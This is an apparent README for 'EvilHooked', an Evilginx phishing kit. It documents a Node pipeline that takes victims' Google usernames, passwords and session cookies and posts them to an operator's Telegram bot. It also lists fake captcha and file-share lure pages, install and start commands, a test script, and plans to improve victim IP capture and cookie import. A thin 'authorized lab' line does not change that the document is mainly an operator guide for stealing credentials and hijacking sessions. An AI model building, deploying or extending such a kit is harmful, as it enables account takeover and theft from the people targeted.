# Telegram capture + captcha redirectors (Latest_Evilginx)

Authorized lab / red-team use only. This document describes the **puppet-bridge Telegram pipeline** added to the EvilHooked binary kit. There is **no Go source** in this tree, so Telegram is **not** patched into the `evilginx` binary. It runs in Node when the mirror/assist capture fires.

This is **not** the `Evilginx_mod-telegramfix` pipeline (no message edits, no email-named `.txt`, no cookie-inject script in the attachment).

---

## Message format

### Caption / text (JSON)

```json
{
    "Target": "google.com",
    "ip": "",
    "user_agent": "",
    "username": "",
    "password": ""
}
```

### Attachment

Always named **`cookies.json`**. Full captured cookie objects (name, value, domain, path, expires, expirationDate, httpOnly, secure, sameSite, hostOnly, session). Importable into a cookie editor. Not a `.txt`, not named after the email.

### When it sends

| Event | What Telegram gets |
|-------|-------------------|
| Username/password first, no session cookies yet | JSON **text only** (`sendMessage`) |
| Google session cookies look complete (SID / `__Secure-1PSID` family) | **New** document: JSON caption + `cookies.json` |
| Same cookie set again | Skipped (hash de-dupe) |
| Cookies change later | **New** message (never `editMessageMedia`) |

---

## New files

Linux kit root:

`Latest_Evilginx/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64/`

Windows kit (same parent zip):

`Latest_Evilginx/EvilHooked_Google_linux_amd64/EvilHooked_Google_win_amd64/`

| Path | Role |
|------|------|
| `puppet-bridge/src/telegram.js` | **New.** Loads bot token/chat id, builds JSON caption + `cookies.json`, posts to Telegram Bot API |
| `evilhooked/redirectors/captcha/index.html` | **New.** Google-style “I’m not a robot” lure page (`{lure_url_html}`) |
| `evilhooked/redirectors/turnstile/index.html` | Cloudflare Turnstile (replace demo sitekey) |
| `evilhooked/redirectors/verify/index.html` | Recapture-style checkbox page |
| `evilhooked/redirectors/verify2/index.html` | Press-and-hold recapture page |
| `evilhooked/redirectors/download_example/index.html` | File-share lure page |

Same files are copied on both OS kits.

---

## Changed files

| Path | Change |
|------|--------|
| `puppet-bridge/src/load-config.js` | Reads `telegram` from `puppet-google.json` (or env) and calls `setTelegramConfig()` |
| `puppet-bridge/src/capture.js` | After writing local capture JSON, calls `notifyTelegramCapture()` (assist path). Honors `skipTelegram` |
| `puppet-bridge/src/mirror/mirror-capture.js` | Calls `notifyTelegramCapture()` on incremental username/password/cookie updates. Disk save uses `skipTelegram` so Telegram is not sent twice |
| `evilhooked/puppet-google.json` | New `telegram.enabled` / `botToken` / `chatId` block |
| `evilhooked/evilginx-config/config.json` | Optional `general.chatid` / `general.teletoken` (ignored unless the binary supports them) |
| `evilhooked/start-evilginx.sh` | Passes `-t "$ROOT/evilhooked/redirectors"`; prints lure + Telegram hints |
| `evilhooked/start-evilginx.ps1` | Same `-t` redirectors dir + console hints |

---

## How it works

```
Lab browser  --HTTPS:443-->  evilginx binary
                                |
                                | puppet.upstream
                                v
                         puppet-bridge :1000
                                |
                    Chrome CDP :9222 (mirror)
                                |
                                v
              notifyEvilginxCapture()  +  POST :9092/puppet/capture
                                |
                                v
                      notifyTelegramCapture()
                                |
                  sendMessage (creds JSON)
               or sendDocument (JSON caption + cookies.json)
```

1. **Config load.** `loadPuppetConfig()` parses `evilhooked/puppet-google.json` and `setTelegramConfig()`. Env vars override empty JSON fields: `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` (aliases `EVILHOOKED_TELEGRAM_TOKEN` / `EVILHOOKED_TELEGRAM_CHAT_ID`).
2. **Telegram is off** until both token and chat id are non-empty (`enabled` defaults true but does nothing without credentials).
3. **Mirror path** (default `mode: "mirror"`): `mirror-capture.js` merges username, password, and cookies per `sessionId`. On a real change it notifies Telegram, then still POSTs to Evilginx `:9092`.
4. **Assist path:** `saveCapture()` in `capture.js` writes `evilhooked/captures/*.json` and notifies Telegram unless `skipTelegram` is set.
5. **Completeness gate.** `cookies.json` is attached only when `payload.done` is set **or** the cookie names look like a Google session (at least two of SID/SSID/HSID/APISID/SAPISID/`__Secure-1PSID`/…). Incomplete dumps wait.
6. **Captcha pages** are ordinary Evilginx HTML redirectors. The binary substitutes `{lure_url_html}` / `{lure_url_js}`. Starters pass `-t evilhooked/redirectors`. If this 4.3 binary rejects `-t`, the pages still exist on disk but lures cannot attach them.

---

## Linux install / run (Ubuntu 22.04 / 24.04 amd64)

Work in the **nested Linux kit**, not the zip root:

```bash
cd ~/…/Latest_Evilginx/EvilHooked_Google_linux_amd64/EvilHooked_Google_linux_amd64
ls START.sh evilhooked puppet-bridge
file evilhooked/evilginx/evilginx   # must be ELF, not PE32
```

### 1. Packages

```bash
sudo apt-get update
sudo apt-get install -y curl ca-certificates gnupg python3 unzip fonts-liberation
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install -y xvfb chromium-browser || sudo apt-get install -y xvfb chromium
```

If Chromium is missing, install Google Chrome’s amd64 `.deb`. Node **18+** is required (`fetch` + `FormData` in `telegram.js`).

### 2. Free ports 53 and 443

```bash
sudo mkdir -p /etc/systemd/resolved.conf.d
echo -e '[Resolve]\nDNSStubListener=no' | sudo tee /etc/systemd/resolved.conf.d/no-stub.conf
sudo systemctl restart systemd-resolved
sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf

sudo systemctl stop nginx apache2 2>/dev/null || true
sudo ufw allow OpenSSH
sudo ufw allow 53
sudo ufw allow 443
# do not open 1000, 9222, or 9092
```

### 3. Display for Chrome CDP

```bash
export DISPLAY=:99
if ! pgrep -a Xvfb | grep -q ':99'; then
  sudo Xvfb :99 -screen 0 1920x1080x24 -ac +extension GLX >/tmp/xvfb.log 2>&1 &
fi
```

### 4. Telegram bot

1. Create a bot with [@BotFather](https://t.me/BotFather); copy the token.
2. Message the bot, then get chat id (`@userinfobot` or `getUpdates`).
3. Edit `evilhooked/puppet-google.json`:

```json
"telegram": {
  "enabled": true,
  "botToken": "123456:ABC…",
  "chatId": "-100…"
}
```

Optional instead of JSON:

```bash
export TELEGRAM_BOT_TOKEN='123456:ABC…'
export TELEGRAM_CHAT_ID='-100…'
```

### 5. Domain + phishlet hostname

Set `evilhooked/evilginx-config/config.json` `general.domain` / `external_ipv4` and `phishlets.google.hostname` to **your** lab domain. Align `puppet-google.json` `phishDomain` with that hostname.

### 6. Start

```bash
sudo -E bash START.sh
```

Wait until `http://127.0.0.1:1000/health` returns `"ok":true`. In the Evilginx console:

```
lures create google
lures edit 0 redirector captcha
lures get-url 0
```

Other redirectors: `turnstile`, `verify`, `verify2`, `download_example`. For Turnstile, replace `sitekey` in `redirectors/turnstile/index.html` with a Cloudflare site key for **your lure hostname**.

### 7. Quick Telegram test (no lure)

With token/chat id set, from the kit directory:

```bash
cd puppet-bridge
node --input-type=module -e '
import { loadPuppetConfig } from "./src/load-config.js";
import { notifyTelegramCapture } from "./src/telegram.js";
const cfg = loadPuppetConfig("../evilhooked/puppet-google.json");
await notifyTelegramCapture(cfg, {
  sessionId: "test",
  username: "lab@example.com",
  password: "unused",
  clientIp: "127.0.0.1",
  userAgent: "telegram_capture.md",
  done: true,
  cookies: [{ name: "SID", value: "test", domain: ".google.com", path: "/", secure: true, httpOnly: true, expires: 0 }],
});
'
```

You should get a `cookies.json` document whose caption is the JSON object above.

---

## Improvements vs telegramfix / stock kit

| | telegramfix Go pipeline | This kit |
|--|-------------------------|----------|
| Where it runs | Inside `evilginx` (`notify.go` / DB `Tmsgid`) | puppet-bridge (only place we can hook) |
| Attachment | `{email}.txt` + JS cookie inject | **`cookies.json`**, full tokens |
| Caption | Emoji session card | Machine-readable JSON |
| Updates | Edit the same Telegram message | New messages only |
| Captcha | Separate fork redirectors | `-t` pages in this kit |
| Google session | Reverse-proxy MITM | Mirror + Chrome CDP (this kit’s strength) |

Also:

- Local captures still land in `evilhooked/captures/` even if Telegram is unset.
- De-dupe avoids flooding the chat on every CDP cookie poll.
- Assist and mirror both notify; mirror does not double-send via `saveCapture`.

---

## Possible improvements

1. **Persist de-dupe to disk.** The `sent` map is in-memory; a bridge restart can re-send the same cookies.
2. **Pass `userAgent` from the victim** on the mirror path. Today it is only sent if `mirror-capture` supplies `t.userAgent`; empty string is common until that field is plumbed from the socket/HTTP request.
3. **`ip` accuracy.** `clientIp` may be the proxy or session id, not `X-Forwarded-For` / real remote addr. Wire the victim IP from Evilginx headers into `notifyEvilginxCapture`.
4. **Chat topics / thread id.** Forum groups need `message_thread_id` in `sendDocument` / `sendMessage`.
5. **Retry + backoff.** A single failed Bot API call is logged and dropped.
6. **Proxy for Telegram.** Restricted VPS networks need `HTTPS_PROXY` or a Bot API local server.
7. **Confirm `-t` on this binary.** If 4.3.0-beta.2 ignores or errors on `-t`, wrap start scripts to detect `unknown flag` and document lure-only flow.
8. **Turnstile sitekey from config.** Stop editing HTML; read sitekey from `puppet-google.json`.
9. **Wait for “done” only.** Optional flag to never send creds-only JSON, only `cookies.json` after a full session.
10. **Cookie import notes.** Some Google cookies are `__Host-` / `__Secure-` and need the matching scheme/host; a one-line import checklist in the caption would reduce operator mistakes.
11. **Do not merge telegramfix `notify.go` into this binary** unless EvilHooked source appears; keep this Node pipeline as the source of truth for this kit.

---

## Operator checklist

- [ ] Linux kit directory (ELF `evilginx`, not `.exe`)
- [ ] Node 18+, Xvfb `:99`, Chrome/Chromium CDP `:9222`
- [ ] Ports 53/443 free; 1000/9092/9222 localhost only
- [ ] `puppet-google.json` `telegram.botToken` + `telegram.chatId`
- [ ] Lab domain in `evilginx-config/config.json` and `phishDomain`
- [ ] `START.sh` → health JSON ok
- [ ] `lures edit N redirector captcha` (or `turnstile`)
- [ ] Test message shows JSON caption + `cookies.json`
